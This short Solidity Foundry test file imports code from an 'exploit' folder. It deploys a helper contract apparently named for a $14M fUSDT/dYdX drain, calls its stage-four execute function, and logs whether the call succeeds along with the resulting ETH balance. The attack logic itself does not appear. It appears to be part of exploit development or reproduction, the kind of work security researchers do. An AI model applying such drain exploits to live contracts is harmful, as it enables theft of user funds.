// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;
import "forge-std/Test.sol";
import "../exploit/Run.s.sol";

contract TestStage4Direct is Test {
    function testStage4OnClean() public {
        // Deploy stage4 helper
        ResetFUSDTDyDx14MDrain helper = new ResetFUSDTDyDx14MDrain();
        
        // Try execute(1) with logging
        try helper.execute(1) {
            emit log("Stage4 execute(1) SUCCEEDED");
        } catch Error(string memory reason) {
            emit log_named_string("Stage4 FAILED with reason", reason);
        } catch (bytes memory data) {
            emit log_named_bytes("Stage4 FAILED with data", data);
        }
        
        emit log_named_uint("ETH balance after", address(this).balance);
    }
    
    receive() external payable {}
}
